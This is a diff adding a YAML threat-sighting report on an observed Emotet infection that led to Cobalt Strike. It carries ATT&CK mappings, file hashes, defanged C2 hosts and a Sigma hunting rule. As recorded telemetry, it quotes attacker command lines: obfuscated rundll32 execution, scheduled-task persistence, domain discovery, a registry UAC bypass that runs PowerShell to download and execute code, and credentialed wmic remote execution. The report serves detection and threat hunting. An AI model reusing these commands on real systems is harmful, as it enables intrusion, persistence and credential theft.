@@ -1,0 +1,776 @@
+---
+header:
+  sightingReportId: 4d284f7b-a336-4724-822f-d104ec5ba6d1
+  status: wip
+  description: This Threat Sighting documents observed Emotet infection followed by Cobalt Strike activity. Weaponized .xlsm delivered via Email. User execution via Excel. Execution and C2 via _RunDll32_. Process injection. Masqueraded _CERTUTIL_. Cobalt Strike stagers. Discovery and Persistence. Victim had protection solution configured to do-not-block.
+  author: Alejandro Houspanossian (@lekz86)
+  acknowledgement: Alejandro Houspanossian (@lekz86)
+  tlp: white
+  threatInformation:
+    adversaries:
+    - unknown
+    malware:
+    - Emotet
+    lolbas:
+    - _CERTUTIL_
+    - Rundll32
+    - Regsvr32
+    tools:
+    - Outlook.exe
+    - Excel.exe
+    - cmd.exe
+    - net.exe
+    - CobaltStrike
+    - mstsc.exe
+    - Systeminfo.exe
+    - whoami.exe
+threatSightings:
+  - sighting: Initial Access - Threat Actor used _Email_ with _.XLSM_ file in attachment for Initial Access.
+    id: a324b667-3f2f-4e88-bd87-64b4147603fd
+    behaviors:
+    - behavior: Outlook created weaponized .xlsm file in temp folder.
+      type: File Created
+      id: 99c16168-8731-441b-8644-fe95b5a9bfc9
+      weapon: maldoc
+      files:
+      - name: Mensaje_08122021.xlsm
+        path: C:\\Users\\#{user}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\A9JD1SAI\\Mensaje_08122021.xlsm
+        sha256: 1CCA953E1FC5BBC240BEA7F1F78D482213F3A078B7824281210E0586F5C92A02
+        process: C:\Program Files (x86)\Microsoft Office\root\Office16\OUTLOOK.EXE
+      - name: info_45373.xlsm
+        path: C:\\Users\\#{user}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\A9JD1SAI\\info_45373.xlsm
+        sha256: CEFEC8049CE1FD759C2FB91BD3046D0FA7E1A0860D067BE3FB5D55B9D8E86323
+        process: C:\Program Files (x86)\Microsoft Office\root\Office16\OUTLOOK.EXE
+      - name: AVISO_612318667.xlsm
+        path: C:\\Users\\#{user}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\NO8YIFRV\\AVISO_612318667.xlsm
+        sha256: 754634A1780C5C04D84F7312E39F44DA80A6383E3B2A00DC2E5E4DEFC6B9D4DA
+        process: C:\Program Files (x86)\Microsoft Office\root\Office16\OUTLOOK.EXE
+      notes:
+      - "'AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook' indicates that file was received as an email attachment"
+      - File name pattern is compatible with observed Emotet campaigns.
+      att&ck:
+        initialAccess:
+        - "T1566.001 - Phishing: Spearphishing Attachment"
+  - sighting: Initial Access - Threat actor used _weaponized Microsoft Office files_ for Execution.
+    id: b514b617-1f2f-4e88-bd87-64b4147605bb
+    behaviors:
+    - behavior: Excel opened weaponized .xlsm file from Outlooks temp folder.
+      id: 1bd1e090-e1ec-4ba8-baf6-d4e8235b36aa
+      type: Process Created
+      weapon: maldoc
+      processes:
+      - cmdLine:
+        - \"C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" \"C:\\Users\\#{user}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\A9JD1SAI\\Mensaje_08122021.xlsm\"
+        process: C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\EXCEL.EXE
+        parentProcess: C:\Program Files (x86)\Microsoft Office\root\Office16\OUTLOOK.EXE
+      notes:
+      - This observable indicates that the user has interacted with the weaponized document.
+      - .xlsm files are Microsoft Excel macro-enabled spreadsheet files.
+      att&ck:
+        execution:
+        - "T1204.002 - User Execution: Malicious File"
+  - sighting: Execution - Threat Actor used _Embedded Office Macro_ to download _.dll_ files from external servers for Command And Control.
+    id: 7ff147be-f28a-4ca9-a07f-adfe2a29347c
+    behaviors:
+    - behavior: Excel performed network connection to public server.
+      id: 33f70107-175b-4a99-a242-4e89ab1bdaec
+      type: Network Accessed
+      weapon: excel
+      connections:
+        - dstIp: 107.180.58[.]57
+          dstHost: pilotscience[.]com
+          protocol: TCP
+          dstPort: 80
+          direction: outbound
+          process: C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\EXCEL.EXE
+      att&ck:
+        commandAndControl:
+        - "T1071.001 - Application Layer Protocol: Web Protocols"
+    - behavior: Excel dropped  malicious .dll file.
+      type: File Created
+      weapon: excel
+      id: 3285da53-58c3-446d-88d1-10347b16c41f
+      files:
+        - name: L1KJS42TeHKjR8H[1].dll
+          path: 'C:\\Users\\#{user}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\PG102WY8\\L1KJS42TeHKjR8H[1].dll'
+          sha256: E8AB1FCA442A536BDFD9A3FAE288FA2DCF7063258C2BCDCBF05F5D8F1F44DAC2
+          process: "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
+      att&ck:
+        commandAndControl:
+        - "T1105 - Ingress Tool Transfer"
+  - sighting: Execution - Threat Actor used _Embedded Office Macro_ to execute _.dll_ files via _RunDll32_ for Defense Evasion.
+    id: abb06412-6d3d-461f-8270-a4ee4b31fcc9
+    behaviors:
+    - behavior: Excel spawned _RunDll32_ to execute malicious dll with obfuscated command-line arguments (bestb.ocx, DllRegisterServer).
+      id: 8bbc958a-2039-4fd8-a2e8-e87a31ff53e7
+      type: Process Created
+      weapon: rundll32
+      processes:
+      - cmdLine:
+        - 'C:\\Windows\\SysWow64\\rundll32.exe ..\\besta.ocx,D\"&\"l\"&\"l\"&\"R\"&\"eg\"&\"i\"&\"s\"&\"t\"&\"e\"&\"rS\"&\"e\"&\"rver'
+        - 'C:\\Windows\\SysWow64\\rundll32.exe ..\\bestb.ocx,D\"&\"l\"&\"l\"&\"R\"&\"eg\"&\"i\"&\"s\"&\"t\"&\"e\"&\"rS\"&\"e\"&\"rver'
+        process: C:\\Windows\\SysWow64\\rundll32.exe
+        parentProcess: C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\EXCEL.EXE
+      notes:
+      - .ocx file extensions correspond to ActiveX control modules
+      - The command-line shows an obfuscated parameter that resolves to the well known 'DllRegisterServer' function name.
+      - Variations on .ocx file name (besta.ocx and bestb.ocx) as observed in different investigations
+      att&ck:
+        defenseEvasion:
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+        - "T1027 - Obfuscated Files or Information"
+  - sighting: Execution - Threat actor used nested invocations of _RunDll32_ for Defense Evasion.
+    id: e3b06473-6d3d-461f-8270-a4ee4b34fcc9
+    behaviors:
+    - behavior: _RunDll32_ spawned itself to execute malicious dll (qoknamoiohhcrxw.oir,dIaBG).
+      id: 5ec1faa6-f93d-44e0-ae6f-5dc47e5fdb8e
+      type: Process Created
+      weapon: rundll32
+      processes:
+      - cmdLine:
+        - 'C:\\WINDOWS\\SysWOW64\\rundll32.exe \"C:\\Users\\#{user}\\AppData\\Local\\Bfzefze\\qoknamoiohhcrxw.oir\",dIaBG'
+        process: C:\\Windows\\SysWow64\\rundll32.exe
+        parentProcess: C:\\Windows\\SysWow64\\rundll32.exe
+      att&ck:
+        defenseEvasion:
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+    - behavior: _RunDll32_ spawned itself to execute malicious dll (qoknamoiohhcrxw.oir,DllRegisterServer).
+      id: dba19c42-48c6-48af-b0b0-48285bd7f218
+      type: Process Created
+      weapon: RunDll32
+      processes:
+      - cmdLine:
+        - 'C:\\WINDOWS\\SysWOW64\\rundll32.exe \"C:\\Users\\#{user}\\AppData\\Local\\Bfzefze\\qoknamoiohhcrxw.oir\",DllRegisterServer'
+        process: C:\\Windows\\SysWow64\\rundll32.exe
+        parentProcess: C:\\Windows\\SysWow64\\rundll32.exe
+      att&ck:
+        defenseEvasion:
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+  - sighting: Execution - Threat actor used _HTTP connections_ to downloaded a masqueraded copy of _CERTUTIL_ for Command And Control.
+    id: 92d21d4c-8593-4724-af26-76435a051941
+    behaviors:
+    - behavior: _RunDll32_ performed network connections.
+      id: 9f3d1705-110d-4a72-9c14-e26f1cf41745
+      type: Network Accessed
+      weapon: rundll32
+      connections:
+        - dstIp: 209.239.112[.]82
+          dstHost: n/d
+          dstPort: 8080
+          protocol: TCP
+          direction: outbound
+          process: 'c:\\windows\\syswow64\\rundll32.exe'
+      att&ck:
+        commandAndControl:
+        - "T1071.001 - Application Layer Protocol: Web Protocols"
+    - behavior: _RunDll32_ dropped  masqueraded copies of _CERTUTIL_.
+      type: File Created
+      id: 95931f1c-5c0b-4f15-93c5-44dff3a40bd2
+      weapon: rundll32
+      files:
+        - name: riboziydzd.exe
+          path: 'C:\\Users\\#{user}\\AppData\\Local\\Temp\\\\riboziydzd.exe'
+          sha256: 1C010BFBF42A6A32EC9BFF5A3A559B51C983D77CE47D30074AA170417FA4CF1D
+          embedFilename: _CERTUTIL_.exe
+          process: "C:\\Windows\\SysWow64\\rundll32.exe"
+        - name: nfysitwtyygcw.exe
+          path: 'C:\\Users\\#{user}\\AppData\\Local\\Temp\\\\nfysitwtyygcw.exe'
+          sha256: 1C010BFBF42A6A32EC9BFF5A3A559B51C983D77CE47D30074AA170417FA4CF1D
+          embedFilename: _CERTUTIL_.exe
+          process: "C:\\Windows\\SysWow64\\rundll32.exe"
+      notes:
+      -  riboziydzd.exe is not signed
+      att&ck:
+        defenseEvasion:
+        - "T1036 - Masquerading"
+        commandAndControl:
+        - "T1105 - Ingress Tool Transfer"
+  - sighting: Execution - Threat actor used Windows Registry Autorun keys for Persistence.
+    id: 33d21d4c-2193-4724-2226-12435a0519aa
+    behaviors:
+    - behavior: _RunDll32_ created persistence via Autorun entries.
+      id: 27ee6318-2920-4444-8648-414c9aafceba
+      type: RegKey Created
+      weapon: rundll32
+      registries:
+        - keyName: HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN
+          keyValueName: QOKNAMOIOHHCRXW.OIR
+          keyValue: 'C:\\WINDOWS\\SysWOW64\\rundll32.exe \"C:\\Users\\#{user}\\AppData\\Local\\Bfzefze\\qoknamoiohhcrxw.oir\",anacSsUgSU'
+          process: 'c:\\windows\\syswow64\\rundll32.exe'
+      att&ck:
+        persistence:
+        - "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+  - sighting: Defense Evasion - Threat actor used _RunDll32_ to launch and inject _CERTUTIL_ for Execution.
+    id: 6dc69c46-ccd8-4573-974c-e7153a504302
+    behaviors:
+    - behavior: _RunDll32_ spawned masqueraded copy of _CERTUTIL_.
+      id: be6e105c-99dc-4eb8-aa4d-374933434e32
+      type: Process Created
+      weapon: certutil
+      processes:
+      - cmdLine:
+        - '\"C:\\Users\\#{user}\\AppData\\Local\\Temp\\\\nfysitwtyygcw.exe\" /scomma \"C:\\Users\\#{user}\\AppData\\Local\\Temp\\8C0F.tmp\"'
+        process: C:\\Users\\#{user}\\AppData\\Local\\Temp\\\\nfysitwtyygcw.exe
+        embedFilename: _CERTUTIL_.exe
+        parentProcess: C:\\Windows\\SysWow64\\rundll32.exe
+      att&ck:
+        defenseEvasion:
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+    - behavior: _RunDll32_ injected the masqueraded _CERTUTIL_ process.
+      id: 1029d7ad-4b32-4d5f-aa1f-7c13486349d8
+      type: Code Injected
+      weapon: rundll32
+      injections:
+      - target: C:\\Users\\#{user}\\AppData\\Local\\Temp\\\\nfysitwtyygcw.exe
+        from: C:\\Windows\\SysWow64\\rundll32.exe
+      att&ck:
+        execution:
+        - "T1055 - Process Injection"
+  - sighting: Execution - Threat actor used _CERTUTIL_ to access Web Browser credentials stores for Credential Access.
+    id: d8c49d99-24ef-4aa0-837a-6a5d36b95741
+    behaviors:
+    - behavior: _CERTUTIL_ (masqueraded and injected) read Chrome credentials store (Login Data).
+      type: File Read
+      weapon: certutil
+      id: 2e6e98b4-8e12-4725-8fd0-c129d9f8ad5f
+      files:
+        - path: 'C:\\Users\\#{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
+          name: 'Login Data'
+          process: "c:\\users\\#{user}\\appdata\\local\\temp\\nfysitwtyygcw.exe"
+      notes:
+      - '"\\User Data\\Default\\Login Data" is a SQlite3 database that stores the credentials of the Default profile'
+      - "Values are encrypted using Microsoft's Data Protection API (DPAPI)"
+      - DPAPI consists of 2 functions -> CryptProtectData() and CryptUnprotectData() which symetrically encrypt/decrypt data.
+      - nfysitwtyygcw.exe is a copy of _CERTUTIL_
+      att&ck:
+        credentialAccess:
+        - "T1555.003 - Credentials from Password Stores: Credentials from Web Browsers"
+    - behavior: _CERTUTIL_ (masqueraded and injected) called CryptUnprotectData API.
+      type: API Invoked
+      id: b745d4a0-4f11-4ebf-afd7-a063969f7fae
+      weapon: certutil
+      apis:
+      - apiName: CryptUnprotectData
+        process: "c:\\users\\#{user}\\appdata\\local\\temp\\nfysitwtyygcw.exe"
+      notes:
+      - CryptUnprotectData function decrypts data using implicit crypto keys tied to a specific user or system.
+      att&ck:
+        credentialAccess:
+        - "T1555.003 - Credentials from Password Stores: Credentials from Web Browsers"
+        execution:
+        - "T1106 - Native API"
+    - behavior: _CERTUTIL_ (masqueraded and injected) accessed Firefox credential store (key4.db).
+      type: File Modified
+      weapon: certutil
+      id: f31f3bd4-40e6-47b1-8b86-426ac9df0dc4
+      files:
+        - path: "C:\\Users\\#{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{random}.default-release\\key4.db"
+          name: key4.db
+          process: "c:\\users\\#{user}\\appdata\\local\\temp\\nfysitwtyygcw.exe"
+      notes:
+      - key4.db is a SQLite database that stores passwords.
+      att&ck:
+        credentialAccess:
+        - "T1555.003 - Credentials from Password Stores: Credentials from Web Browsers"
+  - sighting: Execution - Threat actor used HTTP to download _Cobalt Strike_ stager DLL for Command And Control.
+    id: f6f71a56-757f-4242-8abf-337e6c95b8b1
+    behaviors:
+    - behavior: _RunDll32_ dropped  Cobalt Strike stager DLL at _AppData\\Local_ folder.
+      type: File Created
+      weapon: rundll32
+      id: efdbf2df-779f-47c1-a5ee-ace1f30e5010
+      files:
+        - name: uztmfjfrgicq.dll
+          path: 'C:\\Users\\#{user}\\AppData\\Local\\Bfzefze\\uztmfjfrgicq.dll'
+          sha256: 3F13E9BC8011C8BC8F3D7CB9A616ED6DA1B6F16D9FCAA65D29D81CAF2D5574D3
+          embedFilename: MsgBoxTest.exe
+          process: "C:\\Windows\\SysWow64\\rundll32.exe"
+      att&ck:
+        commandAndControl:
+        - "T1105 - Ingress Tool Transfer"
+  - sighting: Defense Evasion - Threat actor used _RegSvr32_ to execute Cobalt Strike Stager DLL for Execution.
+    id: 55aa7623-d055-43b9-9655-65f788ab9955
+    behaviors:
+    - behavior: _RunDll32_ spawned _RegSvr32_ to execute Cobalt Strike Stager DLL
+      id: 14e81da1-a0f3-4203-9e6e-7b8d3f70bd80
+      type: Process Created
+      weapon: regsvr32
+      processes:
+      - cmdLine:
+        - 'C:\\WINDOWS\\SysWOW64\\regsvr32.exe -s \"C:\\Users\\#{user}\\AppData\\Local\\Bfzefze\\uztmfjfrgicq.dll\"'
+        process: C:\\WINDOWS\\SysWOW64\\regsvr32.exe
+        parentProcess: C:\\Windows\\SysWow64\\rundll32.exe
+      notes:
+      - The embedFilename of the dll is MsgBoxTest.exe
+      att&ck:
+        defenseEvasion:
+        - "T1218.010 - Signed Binary Proxy Execution: Regsvr32"
+    - behavior: _RegSvr32_ connected to default Cobalt Strike named pipe (postex_*).
+      id: 9aaca01e-7e2c-47e6-80a3-5a23d58a2cbb
+      type: NamedPipe Connected
+      weapon: cobaltstrike
+      pipes:
+      - name: '\\.\pipe\postex_b4a6'
+        process: C:\\WINDOWS\\SysWOW64\\regsvr32.exe
+      notes:
+      - NamedPipes are an inter-process communication mechanism on Windows.
+      - NamedPipe traffic that goes host-to-host is encapsulated within the SMB protocol.
+      - NamedPipe name pattern 'postex_[a-z0-9]{4}' matches one of the default NamedPipes used by Cobalt Strike.
+    - behavior: _RegSvr32_ performed multiple network connections to Cobalt Strike C2 server (guvonuk[.]com).
+      id: 31ad1705-110d-4a72-9c14-e26f1cf462bb
+      type: Network Accessed
+      weapon: cobaltstrike
+      connections:
+        - dstIp: 45.147.228[.]140
+          dstHost: guvonuk[.]com
+          dstPort: 8080
+          url: https://guvonuk[.]com/language.js
+          protocol: TCP
+          direction: outbound
+          process: 'c:\\windows\\system32\\regsvr32.exe'
+      att&ck:
+        commandAndControl:
+        - "T1071.001 - Application Layer Protocol: Web Protocols"
+  - sighting: Execution - Threat actor used process injection into _mstsc.exe_ to launch Cobalt Strike post-exploitation tasks for Command And Control.
+    id: 42aa7623-d028-43b9-96fa-65f788ab99dc
+    behaviors:
+    - behavior: _RegSvr32_ spawned mstsc.exe
+      id: ba9ddb54-6b61-4a84-9bd9-825a8feb5821
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - cmdLine:
+        - 'C:\\WINDOWS\\system32\\mstsc.exe'
+        process: C:\\WINDOWS\\system32\\mstsc.exe
+        parentProcess: C:\\Windows\\SysWow64\\regsvr32.exe
+      att&ck:
+        defenseEvasion:
+        - "T1218.010 - Signed Binary Proxy Execution: Regsvr32"
+  - sighting: Command And Control - Threat actor used _Cobalt Strike_ to launch system native tools for Discovery.
+    id: bbaa7623-1234-43b9-96fa-123788ab99dc
+    behaviors:
+    - behavior: _mstsc.exe_ spawned CMD for discovery.
+      id: a326d0ed-6cc9-4fd4-af6b-9fb6d3460f5d
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - cmdLine:
+        - 'C:\\WINDOWS\\system32\\cmd.exe /C ping #{domain}'
+        process: C:\\WINDOWS\\system32\\cmd.exe
+        parentProcess: C:\\WINDOWS\\system32\\mstsc.exe
+    - behavior: _mstsc.exe_ spawned _RunDll32_.
+      id: f42dbf0a-60e2-40d0-b051-b482c87d8294
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - cmdLine:
+        - 'C:\\Windows\\SysWow64\\rundll32.exe'
+        process: C:\\Windows\\SysWow64\\rundll32.exe
+        parentProcess: C:\\WINDOWS\\syswow64\\mstsc.exe
+      att&ck:
+        defenseEvasion:
+        - "T1218.010 - Signed Binary Proxy Execution: Regsvr32"
+    - behavior: _RunDll32_ spawned CMD for Discovery.
+      id: 7c33158c-fb1f-4551-a53d-41ee849dce60
+      type: Process Created
+      weapon: cmd
+      processes:
+      - cmdLine:
+        - C:\\WINDOWS\\system32\\cmd.exe /C ping #{domain}
+        - C:\\WINDOWS\\system32\\cmd.exe /C wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_user GET ds_mail
+        - C:\\WINDOWS\\system32\\cmd.exe /C systeminfo
+        - C:\\WINDOWS\\system32\\cmd.exe /C net user
+        - C:\\WINDOWS\\system32\\cmd.exe /C WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+        - C:\\WINDOWS\\system32\\cmd.exe /C net localgroup administrators
+        - C:\\WINDOWS\\system32\\cmd.exe /C whoami
+        - C:\\WINDOWS\\system32\\cmd.exe /C wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value
+        process: C:\\WINDOWS\\system32\\cmd.exe
+        parentProcess: C:\\Windows\\SysWow64\\rundll32.exe
+      att&ck:
+        discovery:
+        - "T1087.002 - Account Discovery: Domain Account"
+        - "T1069 - Permission Groups Discovery"
+        - "T1018 - Remote System Discovery"
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+  - sighting: Command And Control - Threat actor used HTTP to downloaded additional Cobalt Strike _dll_ files for Command And Control.
+    id: 123a7623-d043-43b9-1234-65f788ab9944
+    behaviors:
+    - behavior: _RunDll32_ dropped  malicious _DLL_ files at _Temp_ and _ProgramData_ folders.
+      type: File Created
+      id: f3f04d3e-e1a4-435d-bbec-b559fab24fb5
+      weapon: cobaltstrike
+      files:
+        - name: log.dll
+          path: 'C:\\Windows\\Temp\\log.dll'
+          sha256: C81653D9A1DC8FCCE9B07AE5E1B9190B18535F29E0067958EEF3420BC0D7CD15
+          process: "C:\\Windows\\SysWow64\\rundll32.exe"
+        - name: log.dll
+          path: 'C:\\Users\\#{user}\\Saved Games\\log.dll'
+          sha256: C81653D9A1DC8FCCE9B07AE5E1B9190B18535F29E0067958EEF3420BC0D7CD15
+          process: "C:\\Windows\\SysWow64\\rundll32.exe"
+        - name: log.dll
+          path: 'C:\\ProgramData\\log.dll'
+          sha256: 7F282CDC49E12F474661A3D2AFBB7410AAA662DB4D14D75C8A5D72289CAA190F
+          process: "C:\\Windows\\SysWow64\\rundll32.exe"
+      att&ck:
+        commandAndControl:
+        - "T1105 - Ingress Tool Transfer"
+  - sighting: Command And Control - Threat actor used _SCHTASK_ to create an scheduled task that executes the Cobalt Strike beacon for Persistence.
+    id: ac1d1702-2bcb-4108-a709-6911a3390706
+    behaviors:
+    - behavior: _RunDll32_ spawned _CMD for creating Persistence via SCHTASK.
+      id: 80607e7a-50f8-4a84-aa0b-d72312a98a4b
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - cmdLine:
+        - 'C:\\WINDOWS\\system32\\cmd.exe /C SCHTASKS /create /tn \"ObjectStoreRecoveryUpdateTask2\" /tr \"rundll32 C:\\Users\\#{user}\\Saved Games\\log.dll Helper pov\" /sc minute /mo 35'
+        process: C:\\WINDOWS\\system32\\cmd.exe
+        parentProcess: C:\\Windows\\SysWow64\\rundll32.exe
+      att&ck:
+        persistence:
+        - "T1053 - Scheduled Tasks"
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+    - behavior: _RunDll32_ spawned CMD for executing scheduled task via SCHTASK.
+      id: 736f8454-f3dc-498a-b7f8-99ae87957958
+      type: Process Created
+      weapon: schtasks
+      processes:
+      - cmdLine:
+        - 'C:\\WINDOWS\\system32\\cmd.exe /C SCHTASKS /run /TN \"ObjectStoreRecoveryUpdateTask2\"'
+        process: C:\\WINDOWS\\system32\\cmd.exe
+        parentProcess: C:\\Windows\\SysWow64\\rundll32.exe
+      att&ck:
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+        - "T1053 - Scheduled Tasks"
+  - sighting: Command And Control - Threat actor used _RunDll32 via an Scheduled Task_ to execute _Cobalt Strike Stager DLL_ for Command And Control.
+    id: acad1702-312c-4108-a129-6911a3390aca
+    behaviors:
+    - behavior: _RunDll32_ executed via Scheduled Task
+      id: fffddb54-6b61-4121-9bd9-825a8feb4152
+      type: Process Created
+      weapon: rundll32
+      processes:
+      - cmdLine:
+        - 'C:\\WINDOWS\\system32\\rundll32.EXE C:\\ProgramData\\log.dll helper pov'
+        process: C:\\WINDOWS\\system32\\rundll32.EXE
+        parentProcess: c:\windows\system32\svchost.exe
+      notes:
+      - This is result of the Persistence created before.
+      att&ck:
+        defenseEvasion:
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+  - sighting: Command And Control - Threat actor used _Cobalt Strike_ to perform hands-on-keyboard discovery for Discovery.
+    id: cccd1702-336c-4108-a709-6911a3390aaa
+    behaviors:
+    - behavior: _RunDll32_ spawned mstsc.exe
+      id: cccddb54-6b61-4121-9bd9-825a8feb4152
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - cmdLine:
+        - 'C:\\WINDOWS\\system32\\mstsc.exe'
+        process: C:\\WINDOWS\\system32\\mstsc.exe
+        parentProcess: C:\\Windows\\SysWow64\\rundll32.exe
+      att&ck:
+        defenseEvasion:
+        - "T1218.010 - Signed Binary Proxy Execution: Regsvr32"
+    - behavior: _RunDll32_ spawned CMD for multiple discovery commands.
+      id: 555e358c-fb1f-4551-a53d-41ee849d1212
+      type: Process Created
+      weapon: cmd
+      processes:
+      - process: C:\\WINDOWS\\system32\\cmd.exe
+        cmdLine:
+        - C:\\WINDOWS\\system32\\cmd.exe /C net group \"administradores de dominio\" /#{domain}
+        - C:\\WINDOWS\\system32\\cmd.exe /C net group \"administradores dominio\" /#{domain}
+        - C:\\WINDOWS\\system32\\cmd.exe /C net localgroup administrators
+        - C:\\WINDOWS\\system32\\cmd.exe /C net localgroup Administradoras
+        - C:\\WINDOWS\\system32\\cmd.exe /C net Administradoras de grupos locales
+        - C:\\WINDOWS\\system32\\cmd.exe /C net grupo local administradoras
+        - 'C:\\WINDOWS\\system32\\cmd.exe /C net user #{user} /#{domain}'
+        parentProcess: c:\\windows\\system32\\rundll32.exe
+      att&ck:
+        discovery:
+        - "T1087.002 - Account Discovery: Domain Account"
+        - "T1069 - Permission Groups Discovery"
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+  - sighting: Command And Control - Threat actor used _Reg.exe_ to attempt a known Elevation Control Mechanism bypass for Privilege Escalation.
+    id: dddd1702-116c-5408-a709-6911a3390123
+    behaviors:
+    - behavior: _RunDll32_ spawned CMD for registry modification
+      id: 123ddb54-6b61-4121-9bd9-825a8feb4152
+      type: Process Created
+      weapon: reg
+      processes:
+      - cmdLine:
+        - C:\\WINDOWS\\system32\\cmd.exe /C reg add HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden iex -c (New-Object Net.Webclient).DownloadString('http://127.0.0.1:3130/')\" /f
+        process: C:\\WINDOWS\\system32\\cmd.exe
+        parentProcess: C:\\Windows\\SysWow64\\rundll32.exe
+      att&ck:
+        privilegeEscalation:
+        - "T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control"
+        - "T1112 - Modify Registry"
+        - "T1059.001 - PowerShell"
+    - behavior: _RunDll32_ spawned CMD for multiple discovery commands.
+      id: 66ee358c-fb1f-4551-a53d-41ee849d12bb
+      type: Process Created
+      weapon: net
+      processes:
+      - cmdLine:
+        - C:\\WINDOWS\\system32\\cmd.exe /C net group \"administradores de dominio\" /#{domain}
+        - C:\\WINDOWS\\system32\\cmd.exe /C net group \"administradores dominio\" /#{domain}
+        - C:\\WINDOWS\\system32\\cmd.exe /C net localgroup administrators
+        - C:\\WINDOWS\\system32\\cmd.exe /C net localgroup Administradoras
+        - C:\\WINDOWS\\system32\\cmd.exe /C net Administradoras de grupos locales
+        - C:\\WINDOWS\\system32\\cmd.exe /C net grupo local administradoras
+        - C:\\WINDOWS\\system32\\cmd.exe /C net user #{user} /#{domain}
+        process: C:\\WINDOWS\\system32\\cmd.exe
+        parentProcess: c:\\windows\\system32\\rundll32.exe
+      att&ck:
+        discovery:
+        - "T1087.002 - Account Discovery: Domain Account"
+        - "T1069 - Permission Groups Discovery"
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+  - sighting: Command And Control - Threat actor used _Cobalt Strike_ for initiating command execution on remote hosts via _CMD_ and _WMIC_ for Discovery.
+    id: abc694e2-1239-405e-1235-c3e137f61123
+    behaviors:
+    - behavior: _RunDll32_ spawned _CMD_
+      id: dcda7f6e-8312-4279-ad66-54262a3399c0
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - cmdLine:
+        - 'cmd.exe /C wmic  /node:\"DC01\" /user:\"DOMAIN\\admin\" /password:\"cleartextpass\" process call create \"cmd /c vssadmin list shadows >> c:\\log.txt\"'
+        process: C:\\WINDOWS\\system32\\cmd.exe
+        parentProcess: C:\\Windows\\SysWow64\\rundll32.exe
+      att&ck:
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+        - "T1047 - WMI"
+  - sighting: Command And Control - Threat actor used _WMIC via Cobalt Strike_ to list existing Volume Shadow Copies via _vssadmin.exe_ for Discovery.
+    id: be6694e2-ca89-405e-9095-c3e137f6105d
+    behaviors:
+    - behavior: _CMD_ spawned _WMIC_ to execute command on remote host
+      id: 879a7f6e-1234-4279-bbbb-54262a339888
+      type: Process Created
+      weapon: wmic
+      processes:
+      - cmdLine:
+        - 'wmic  /node:\"DC01\" /user:\"DOMAIN\\admin\" /password:\"cleartextpass\" process call create \"cmd /c vssadmin list shadows >> c:\\log.txt\"'
+        process: wmic.exe
+        parentProcess: C:\\WINDOWS\\system32\\cmd.exe
+      att&ck:
+        execution:
+        - "T1047 - WMI"
+  - sighting: Command And Control - Threat actor used HTTP connections for Command And Control.
+    id: 1603e36c-1d13-4e4a-8e5b-ee5e7e82d639
+    behaviors:
+    - behavior: Performed multiple network connections.
+      id: a11236b0-14a6-40d0-a997-d70eb7146437
+      type: Network Accessed
+      weapon: cobaltstrike
+      connections:
+        - dstIp: 116.124.128[.]206
+          dstHost: n/d
+          protocol: tcp
+          dstPort: 443
+          direction: outbound
+          process: "C:\\Windows\\Syswow64\\rundll32.exe"
+      att&ck:
+        commandAndControl:
+        - "T1071.001 - Application Layer Protocol: Web Protocols"
+    - behavior: Performed multiple DNS Query requests to email related domains.
+      type: DNS Queried
+      weapon: cobaltstrike
+      id: 0b79c3a8-b63a-486a-b423-de87ac4eb89b
+      connections:
+        - dstIp: n/d
+          dstHost: imap.gmail.com
+          protocol: tcp
+          dstPort: 53
+          direction: outbound
+          process: "C:\\Windows\\Syswow64\\rundll32.exe"
+threatHunting:
+  - query: Hunt for .xlsm files opened from Outlook temp folder
+    queryId: e90da083-402a-4400-9d79-ac179b1e2461
+    type: sigma
+    behaviorIds:
+    - 1bd1e090-e1ec-4ba8-baf6-d4e8235b36aa
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+      outlook:
+          ParentImage|endswith:
+              - '\\outlook.exe'
+      excel:
+          Image|endswith:
+              - '\\Excel.exe'
+      xlsm:
+          CommandLine|contains|all:
+              - 'Content.Outlook'
+              - 'xlsm'
+      condition: all of them
